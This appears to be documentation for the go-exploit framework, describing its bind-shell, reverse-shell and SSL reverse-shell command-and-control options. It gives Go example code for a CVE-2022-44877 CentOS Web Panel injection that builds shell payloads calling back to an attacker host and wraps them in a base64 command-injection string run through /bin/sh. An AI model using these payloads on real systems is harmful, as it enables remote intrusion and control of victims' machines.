In `go-exploit`, the command and control (C2) functionality provides a basic command-line interface to the victim machine. At the moment, there are three supported C2 types:

1. *SimpleShellClient* - An unencrypted terminal via a bind shell.
2. *SimpleShellServer* - An unencrypted terminal via a reverse shell.
3. *SSLShellServer* - An encrypted terminal via a reverse shell.
4. *HTTPServeFile* - An unencrypted HTTP server that serves a user configured file (not a traditional c2)

These C2 types allow the attacker to interact with the compromised machine through a command-line interface. However, they don't currently offer advanced features. The C2 interface in `go-exploit` is designed to be flexible, making it suitable for future development and expansion.

To specify the supported C2 types for an exploit, you need to define them in the exploit's `main` function. Here's an example:

```go
func main() {
	supportedC2 := []c2.Impl{
		c2.SSLShellServer,
		c2.SimpleShellServer,
		c2.SimpleShellClient,
	}
	conf := config.New(config.CodeExecution, supportedC2, "CentOS Web Panel", "CVE-2022-44877", 2031)
	sploit := CWPInjection{}
	exploit.RunProgram(sploit, conf)
}
```

In the example above, the exploit supports all three C2 types, with `c2.SSLShellServer` set as the default. During the exploitation phase, the exploit needs to check the user-requested C2 type to determine the appropriate actions. Here's an example of how this can be done:

```go
func (sploit CWPInjection) RunExploit(conf *config.Config) bool {
	generated, ok := generatePayload(conf)
	if !ok {
		return false
	}
	// Rest of the exploit logic
}

func generatePayload(conf *config.Config) (string, bool) {
	generated := ""

	switch conf.C2Type {
	case c2.SSLShellServer:
		output.PrintfStatus("Sending an SSL reverse shell payload for port %s:%d", conf.Lhost, conf.Lport)
		generated = payload.ReverseShellMknodOpenSSL(conf.Lhost, conf.Lport)
	case c2.SimpleShellServer:
		output.PrintfStatus("Sending a reverse shell payload for port %s:%d", conf.Lhost, conf.Lport)
		generated = payload.ReverseShellBash(conf.Lhost, conf.Lport)
	case c2.SimpleShellClient:
		output.PrintfStatus("Sending a bind shell for port %d", conf.Bport)
		generated = payload.BindShellMkfifoNetcat(conf.Bport)
	default:
		output.PrintError("Invalid payload")
		return "", false
	}

	payload64 := b64.StdEncoding.EncodeToString([]byte(generated))
	generated = "`echo${IFS}" + payload64 + "|base64${IFS}-d|/bin/sh`"

	return generated, true
}
```

In the `RunExploit` function, `generatePayload` is called to generate the appropriate payload based on the selected C2 type. The `generatePayload` function uses a switch statement to determine the payload generation logic for each C2 type. It generates the payload and returns it as a string, along with a boolean flag indicating whether the generation was successful.

Note that the payload generation logic in the example is specific to the `CWPInjection` exploit and may vary for different exploits and C2 types.
